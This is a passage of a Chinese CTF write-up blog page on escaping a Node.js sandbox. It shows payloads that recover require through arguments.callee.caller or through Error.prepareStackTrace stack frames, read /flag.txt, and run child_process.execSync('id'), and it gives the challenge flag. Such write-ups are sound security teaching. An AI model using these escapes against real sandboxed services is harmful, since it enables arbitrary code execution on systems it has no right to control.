+<p>但是<code>import</code>还可以动态引入（作者忽略了</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>import</span><span style=color:#111>(</span><span style=color:#d88200>&#39;fs&#39;</span><span style=color:#111>).</span><span style=color:#75af00>then</span><span style=color:#111>(</span><span style=color:#75af00>fs</span><span style=color:#111>=&gt;</span><span style=color:#75af00>fs</span><span style=color:#111>.</span><span style=color:#75af00>readFile</span><span style=color:#111>(</span><span style=color:#d88200>&#39;/flag.txt&#39;</span><span style=color:#111>,</span><span style=color:#d88200>&#39;utf-8&#39;</span><span style=color:#111>,(</span><span style=color:#75af00>err</span><span style=color:#111>,</span><span style=color:#75af00>data</span><span style=color:#111>)=&gt;{</span><span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>data</span><span style=color:#111>,</span><span style=color:#75af00>err</span><span style=color:#111>)}));</span>
+</code></pre></div><p>预期则是这样</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#111>(</span><span style=color:#00a8c8>function</span><span style=color:#111>(){</span><span style=color:#00a8c8>return</span> <span style=color:#75af00>arguments</span><span style=color:#111>.</span><span style=color:#75af00>callee</span><span style=color:#111>.</span><span style=color:#75af00>caller</span><span style=color:#111>.</span><span style=color:#75af00>arguments</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>](</span><span style=color:#d88200>&#34;fs&#34;</span><span style=color:#111>).</span><span style=color:#75af00>readFileSync</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/flag.txt&#34;</span><span style=color:#111>,</span><span style=color:#d88200>&#34;utf-8&#34;</span><span style=color:#111>)})()</span>
+</code></pre></div><p>随便一个函数，<code>arguments.callee</code>得到当前执行的函数，<code>arguments.callee.caller</code>得到调用它的函数，再通过<code>arguments[1]</code>获得到<code>require</code>这个参数，执行<code>require("fs")</code>以及后续操作</p>
+<p>————这里还有一个方法2：</p>
+<p>利用Node可以拿到<code>structured Stack Trace</code>的feature</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>function</span> <span style=color:#75af00>CustomError</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>oldStackTrace</span> <span style=color:#f92672>=</span> <span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>prepareStackTrace</span>
+  <span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+    <span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>prepareStackTrace</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>structuredStackTrace</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>structuredStackTrace</span>
+    <span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>captureStackTrace</span><span style=color:#111>(</span><span style=color:#00a8c8>this</span><span style=color:#111>)</span>
+    <span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>stack</span>
+  <span style=color:#111>}</span> <span style=color:#00a8c8>finally</span> <span style=color:#111>{</span>
+    <span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>prepareStackTrace</span> <span style=color:#f92672>=</span> <span style=color:#75af00>oldStackTrace</span>
+  <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>function</span> <span style=color:#75af00>trigger</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+  <span style=color:#00a8c8>const</span> <span style=color:#75af00>err</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>CustomError</span><span style=color:#111>()</span>
+  <span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>const</span> <span style=color:#75af00>x</span> <span style=color:#00a8c8>of</span> <span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>stack</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+    <span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>x</span><span style=color:#111>.</span><span style=color:#75af00>getFunction</span><span style=color:#111>()</span><span style=color:#f92672>+</span><span style=color:#d88200>&#34;&#34;</span><span style=color:#111>)</span>
+  <span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#75af00>trigger</span><span style=color:#111>()</span>
+</code></pre></div><p>我们可以用<code>x.getFunction()</code>拿到上层的function，就是Node在执行时加上的wrapper，再通过<code>arguments</code>得到<code>fn.arguments[1]</code>（也就是<code>require</code></p>
+<p>放到题目中由于没有<code>Error</code>可以用，我们直接自制一个TypeError</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+	<span style=color:#00a8c8>null</span><span style=color:#111>.</span><span style=color:#75af00>f</span><span style=color:#111>()</span>
+<span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>TypeError</span> <span style=color:#f92672>=</span> <span style=color:#75af00>e</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span>
+<span style=color:#111>}</span>
+<span style=color:#111>Error</span> <span style=color:#f92672>=</span> <span style=color:#75af00>TypeError</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>.</span><span style=color:#75af00>__proto__</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span>
+</code></pre></div><p>再利用TypeError是继承自Error的特性，就可以不依靠global拿到Error constructor了</p>
+<p>全payload</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+	<span style=color:#00a8c8>null</span><span style=color:#111>.</span><span style=color:#75af00>f</span><span style=color:#111>()</span>
+<span style=color:#111>}</span> <span style=color:#00a8c8>catch</span> <span style=color:#111>(</span><span style=color:#75af00>e</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>TypeError</span> <span style=color:#f92672>=</span> <span style=color:#75af00>e</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span>
+<span style=color:#111>}</span>
+<span style=color:#111>Object</span> <span style=color:#f92672>=</span> <span style=color:#111>{}.</span><span style=color:#75af00>constructor</span>
+<span style=color:#111>String</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#39;&#39;</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span>
+<span style=color:#111>Error</span> <span style=color:#f92672>=</span> <span style=color:#75af00>TypeError</span><span style=color:#111>.</span><span style=color:#75af00>prototype</span><span style=color:#111>.</span><span style=color:#75af00>__proto__</span><span style=color:#111>.</span><span style=color:#75af00>constructor</span>
+<span style=color:#00a8c8>function</span> <span style=color:#75af00>CustomError</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+	<span style=color:#00a8c8>const</span> <span style=color:#75af00>oldStackTrace</span> <span style=color:#f92672>=</span> <span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>prepareStackTrace</span>
+	<span style=color:#00a8c8>try</span> <span style=color:#111>{</span>
+		<span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>prepareStackTrace</span> <span style=color:#f92672>=</span> <span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>,</span> <span style=color:#75af00>structuredStackTrace</span><span style=color:#111>)</span> <span style=color:#111>=&gt;</span> <span style=color:#75af00>structuredStackTrace</span>
+		<span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>captureStackTrace</span><span style=color:#111>(</span><span style=color:#00a8c8>this</span><span style=color:#111>)</span>
+		<span style=color:#00a8c8>this</span><span style=color:#111>.</span><span style=color:#75af00>stack</span>
+	<span style=color:#111>}</span> <span style=color:#00a8c8>finally</span> <span style=color:#111>{</span>
+		<span style=color:#111>Error</span><span style=color:#111>.</span><span style=color:#75af00>prepareStackTrace</span> <span style=color:#f92672>=</span> <span style=color:#75af00>oldStackTrace</span>
+	<span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#00a8c8>function</span> <span style=color:#75af00>trigger</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+	<span style=color:#00a8c8>const</span> <span style=color:#75af00>err</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>new</span> <span style=color:#75af00>CustomError</span><span style=color:#111>()</span>
+	<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>stack</span><span style=color:#111>[</span><span style=color:#ae81ff>0</span><span style=color:#111>])</span>
+	<span style=color:#00a8c8>for</span> <span style=color:#111>(</span><span style=color:#00a8c8>const</span> <span style=color:#75af00>x</span> <span style=color:#00a8c8>of</span> <span style=color:#75af00>err</span><span style=color:#111>.</span><span style=color:#75af00>stack</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+		<span style=color:#00a8c8>const</span> <span style=color:#75af00>fn</span> <span style=color:#f92672>=</span> <span style=color:#75af00>x</span><span style=color:#111>.</span><span style=color:#75af00>getFunction</span><span style=color:#111>()</span>
+		<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#111>String</span><span style=color:#111>(</span><span style=color:#75af00>fn</span><span style=color:#111>).</span><span style=color:#75af00>slice</span><span style=color:#111>(</span><span style=color:#ae81ff>0</span><span style=color:#111>,</span> <span style=color:#ae81ff>200</span><span style=color:#111>))</span>
+		<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>fn</span><span style=color:#f92672>?</span><span style=color:#111>.</span><span style=color:#75af00>arguments</span><span style=color:#111>)</span>
+		<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#d88200>&#39;=&#39;</span><span style=color:#111>.</span><span style=color:#75af00>repeat</span><span style=color:#111>(</span><span style=color:#ae81ff>40</span><span style=color:#111>))</span>
+		<span style=color:#00a8c8>if</span> <span style=color:#111>((</span><span style=color:#75af00>args</span> <span style=color:#f92672>=</span> <span style=color:#75af00>fn</span><span style=color:#f92672>?</span><span style=color:#111>.</span><span style=color:#75af00>arguments</span><span style=color:#111>)</span><span style=color:#f92672>?</span><span style=color:#111>.</span><span style=color:#75af00>length</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>0</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>req</span> <span style=color:#f92672>=</span> <span style=color:#75af00>args</span><span style=color:#111>[</span><span style=color:#ae81ff>1</span><span style=color:#111>]</span>
+			<span style=color:#75af00>console</span><span style=color:#111>.</span><span style=color:#75af00>log</span><span style=color:#111>(</span><span style=color:#75af00>req</span><span style=color:#111>(</span><span style=color:#d88200>&#39;child_process&#39;</span><span style=color:#111>).</span><span style=color:#75af00>execSync</span><span style=color:#111>(</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>).</span><span style=color:#75af00>toString</span><span style=color:#111>())</span>
+		<span style=color:#111>}</span>
+	<span style=color:#111>}</span>
+<span style=color:#111>}</span>
+<span style=color:#75af00>trigger</span><span style=color:#111>()</span>
+<span style=color:#75715e>// dice{who_needs_builtins_when_you_have_arguments}
+</span><span style=color:#75715e></span>
+</code></pre></div><hr>
+<p>人在家中坐，开学延期天上来</p>
+<p>不能继续摆了，我他妈学爆！！！！！！</p>
+</div>
+</section>
+</article>
+</main>
+<div class="w-full h-0 flex-none order-3"></div>
+<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+<div class="md:max-w-xs flex flex-col md:items-end">
+<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+<li class="px-1 md:px-0">
+<a href=/posts/ title="Posts page">
+Posts
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/relax/ title="Relaxxx page">
+Relaxxx
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/categories/ title="Categories page">
+Categories
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/tags/ title="Tags page">
+Tags
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/series/ title="Series page">
+Series
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/about/ title="About page">
+About
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/friends/ title="Friends page">
+Friends
+</a>
+</li>
+<div id=fastSearch class=m-0>
+<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
+placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
+<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
+</ul>
+</div>
+</ul>
+<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start md:flex-col max-h-16">
+<a href=https://space.bilibili.com/1651059195 target=_blank class="bilibili icon pl-1 text-eucalyptus-400 hover:text-java-400" title="bilibili link" rel=noopener aria-label="follow on bilibili——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M7.172 2.757 10.414 6h3.171l3.243-3.242a1 1 0 011.415 1.415L16.414 6H18.5A3.5 3.5.0 0122 9.5v8A3.5 3.5.0 0118.5 21h-13A3.5 3.5.0 012 17.5v-8A3.5 3.5.0 015.5 6h2.085L5.757 4.171a1 1 0 011.415-1.415zM18.5 8h-13A1.5 1.5.0 004.007 9.356L4 9.5v8a1.5 1.5.0 001.356 1.493L5.5 19h13a1.5 1.5.0 001.493-1.356L20 17.5v-8A1.5 1.5.0 0018.5 8zM8 11a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1zm8 0a1 1 0 011 1v2a1 1 0 01-2 0v-2a1 1 0 011-1z"/></g></svg>
+</div>
+</a>
+<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
+</div>
+</a>
+<a href=354c3267364c2b5a354c6d49354c7147364b656a356f69523737794d354c69413561366136494f393534796335596977355a436e37377966 target=_blank class="netease-cloud-music icon pl-1 text-eucalyptus-400 hover:text-java-400" title="netease-cloud-music link" rel=noopener aria-label="follow on netease-cloud-music——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M10.421 11.375c-.294 1.028.012 2.064.784 2.653 1.061.81 2.565.3 2.874-.995.08-.337.103-.722.027-1.056-.23-1.001-.52-1.988-.792-2.996-1.33.154-2.543 1.172-2.893 2.394zm5.548-.287c.273 1.012.285 2.017-.127 3-1.128 2.69-4.721 3.14-6.573.826-1.302-1.627-1.28-3.961.06-5.734.78-1.032 1.804-1.707 3.048-2.054l.379-.104c-.084-.415-.188-.816-.243-1.224-.176-1.317.512-2.503 1.744-3.04 1.226-.535 2.708-.216 3.53.76.406.479.395 1.08-.025 1.464-.412.377-.996.346-1.435-.09-.247-.246-.51-.44-.877-.436-.525.006-.987.418-.945.937.037.468.173.93.3 1.386.022.078.216.135.338.153 1.334.197 2.504.731 3.472 1.676 2.558 2.493 2.861 6.531.672 9.44-1.529 2.032-3.61 3.168-6.127 3.409-4.621.44-8.664-2.53-9.7-7.058C2.515 10.255 4.84 5.831 8.795 4.25c.586-.234 1.143-.031 1.371.498.232.537-.019 1.086-.61 1.35-2.368 1.06-3.817 2.855-4.215 5.424-.533 3.433 1.656 6.776 5 7.72 2.723.77 5.658-.166 7.308-2.33 1.586-2.08 1.4-5.099-.427-6.873a3.979 3.979.0 00-1.823-1.013c.198.716.389 1.388.57 2.062z"/></g></svg>
+</div>
+</a>
+<a href=2517834528 target=_blank class="qq icon pl-1 text-eucalyptus-400 hover:text-java-400" title="qq link" rel=noopener aria-label="follow on qq——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M17.535 12.514l-.696-1.796c0-.021.01-.375.01-.558C16.848 7.088 15.446 4 12 4s-4.848 3.088-4.848 6.16c0 .183.009.537.01.558l-.696 1.796c-.19.515-.38 1.05-.517 1.51-.657 2.189-.444 3.095-.282 3.115.348.043 1.354-1.648 1.354-1.648.0.98.488 2.258 1.542 3.18-.394.127-.878.32-1.188.557-.28.214-.245.431-.194.52.22.385 3.79.245 4.82.125 1.03.12 4.599.26 4.82-.126.05-.088.085-.305-.194-.519-.311-.237-.795-.43-1.19-.556 1.055-.923 1.542-2.202 1.542-3.181.0.0 1.007 1.691 1.355 1.648.162-.02.378-.928-.283-3.116-.14-.463-.325-.994-.516-1.509zm1.021 8.227c-.373.652-.833.892-1.438 1.057-.24.065-.498.108-.794.138-.44.045-.986.065-1.613.064a33.23 33.23.0 01-2.71-.116c-.692.065-1.785.114-2.71.116a16.07 16.07.0 01-1.614-.064 4.928 4.928.0 01-.793-.138c-.605-.164-1.065-.405-1.44-1.059a2.274 2.274.0 01-.239-1.652c-.592-.132-1.001-.483-1.279-.911a2.43 2.43.0 01-.309-.71 4.028 4.028.0 01-.116-1.106c.013-.785.187-1.762.532-2.912.14-.466.327-1.008.568-1.655l.553-1.43a15.496 15.496.0 01-.002-.203C5.152 5.605 7.588 2 12 2c4.413.0 6.848 3.605 6.848 8.16l-.001.203.553 1.43.01.026c.225.606.413 1.153.556 1.626.348 1.15.522 2.129.535 2.916.007.407-.03.776-.118 1.108-.066.246-.161.48-.31.708-.276.427-.684.776-1.277.91.13.554.055 1.14-.24 1.654z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky target=_blank class="wechat icon pl-1 text-eucalyptus-400 hover:text-java-400" title="wechat link" rel=noopener aria-label="follow on wechat——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g fill-rule="evenodd"><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M10 14.676v-.062c0-2.508 2.016-4.618 4.753-5.233C14.389 7.079 11.959 5.2 8.9 5.2 5.58 5.2 3 7.413 3 9.98c0 .969.36 1.9 1.04 2.698.032.038.083.094.152.165a3.568 3.568.0 011.002 2.238 3.612 3.612.0 012.363-.442c.166.026.302.046.405.06A7.254 7.254.0 0010 14.675zm.457 1.951a9.209 9.209.0 01-2.753.055 19.056 19.056.0 01-.454-.067 1.612 1.612.0 00-1.08.212l-1.904 1.148a.806.806.0 01-.49.117.791.791.0 01-.729-.851l.15-1.781a1.565 1.565.0 00-.439-1.223 5.537 5.537.0 01-.241-.262C1.563 12.855 1 11.473 1 9.979 1 6.235 4.537 3.2 8.9 3.2c4.06.0 7.403 2.627 7.85 6.008 3.372.153 6.05 2.515 6.05 5.406.0 1.193-.456 2.296-1.229 3.19-.051.06-.116.13-.195.21a1.24 1.24.0 00-.356.976l.121 1.423a.635.635.0 01-.59.68.66.66.0 01-.397-.094l-1.543-.917a1.322 1.322.0 00-.874-.169c-.147.023-.27.04-.368.053-.316.04-.64.062-.969.062-2.694.0-4.998-1.408-5.943-3.401zm6.977 1.31a3.325 3.325.0 011.676.174 3.25 3.25.0 01.841-1.502c.05-.05.087-.09.106-.112.489-.565.743-1.213.743-1.883.0-1.804-1.903-3.414-4.4-3.414-2.497.0-4.4 1.61-4.4 3.414s1.903 3.414 4.4 3.414c.241.0.48-.016.714-.046.08-.01.188-.025.32-.046z"/></g></svg>
+</div>
+</a>
+<a href=https://weibo.com/u/3337203335203336203332203334203333203334203331203331203332 target=_blank class="weibo icon pl-1 text-eucalyptus-400 hover:text-java-400" title="weibo link" rel=noopener aria-label="follow on weibo——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M20.194 14.197c0 3.362-4.53 6.424-9.926 6.424C5.318 20.62 1 18.189 1 14.534c0-1.947 1.18-4.087 3.24-6.088 2.832-2.746 6.229-4.033 7.858-2.448.498.482.723 1.122.719 1.858 1.975-.576 3.65-.404 4.483.752.449.623.532 1.38.326 2.207 1.511.61 2.568 1.77 2.568 3.382zm-4.44-2.07c-.386-.41-.4-.92-.198-1.41.208-.508.213-.812.12-.94-.264-.368-1.533-.363-3.194.311a2.043 2.043.0 01-.509.14c-.344.046-.671.001-.983-.265-.419-.359-.474-.855-.322-1.316.215-.67.18-1.076.037-1.215-.186-.18-.777-.191-1.659.143-1.069.405-2.298 1.224-3.414 2.306C3.925 11.54 3 13.218 3 14.534c0 2.242 3.276 4.087 7.268 4.087 4.42.0 7.926-2.37 7.926-4.424.0-.738-.637-1.339-1.673-1.652-.394-.113-.536-.171-.767-.417zm7.054-1.617a1 1 0 01-1.936-.502 4 4 0 00-4.693-4.924 1 1 0 11-.407-1.958 6 6 0 017.036 7.384z"/></g></svg>
+</div>
+</a>
+<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
+</div>
+</a>
+</div>
+<div class="text-sm text-gray-500 leading-tight a-gray">
+<br>
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 5112 words in this page.
+</div>
+</div>
+</div>
+</aside>
+<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
+<hr class=double-line>
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+<a class=flex-grow-0 href=/2022/01/24/knightctf2022-wp/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
+KnightCTF2022 Wp
+</a>
+<a class=flex-grow-0 href=/2022/02/17/defcampctf2022-wp/>
+defcampCTF2022 Wp
+<svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M16.172 11l-5.364-5.364 1.414-1.414L20 12l-7.778 7.778-1.414-1.414L16.172 13H4v-2z"/></svg></a>
+</div>
+<div>
+<div class="font-serif pb-2 flex align-start leading-loose">
+<span class="heading pr-6 leading-loose">Related</span>
+<span>
+<a href=/2022/01/24/knightctf2022-wp/>KnightCTF2022 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2022/01/19/buuoj-web-wp/>buuoj刷题记录-web</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/12/28/ctfshow-1221-bailancup-wp/>CTFshow1221摆烂杯 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/12/20/hxpctf2021-wp/>hxpCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/12/15/idekctf2021-wp/>idekCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/12/12/nitectf2021-wp/>niteCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/17/jueyucup-2021-wp/>深育杯2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/16/longyuanzhanyi-ctf-wp/>陇原战疫CTF Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/16/ctfshow-1121-jjcup-wp/>CTFshow1121击剑杯 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/14/bilibili-sec1024-wp/>Bilibili 1024安全攻防 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/11/07/buuoj-fixchalls-wp/>buuoj加固题 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/30/killerqueenctf2021-wp/>KillerQueenCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/30/deconstructf2021-wp/>DeconstruCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/26/qwnt2021-wp/>2021强网拟态 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/10/24/dasctf1021-wp/>DasCTF1021 Wp</a>
+</span>
+</div>
+</div>
+<hr>
+<div class=pb-2>
+<div id=disqus_thread></div>
+<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//amiaaaz.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
+<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
+<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
+</div>
+<hr>
+</footer>
+<script src=/dist/app.js></script>
+<script src=/lib/fuse.min.js></script>
+<script src=/lib/fastsearch.js></script>
+</div>
+</body>
+</html>
